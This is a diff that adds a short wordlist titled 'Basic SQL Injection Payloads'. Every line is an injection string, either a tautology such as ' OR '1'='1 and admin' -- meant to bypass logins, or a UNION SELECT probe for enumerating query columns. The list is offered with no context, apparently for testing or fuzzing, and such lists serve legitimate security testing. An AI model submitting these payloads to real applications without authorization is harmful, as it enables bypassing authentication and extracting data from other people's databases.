@@ -1,0 +1,13 @@
+# Basic SQL Injection Payloads
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+' OR 'a'='a
+') OR ('1'='1
+admin' --
+admin' #
+admin'/*
+' or 1=1 limit 1 --
+' union select null--
+' union select 1,2,3--
+' union all select 1,2,3--
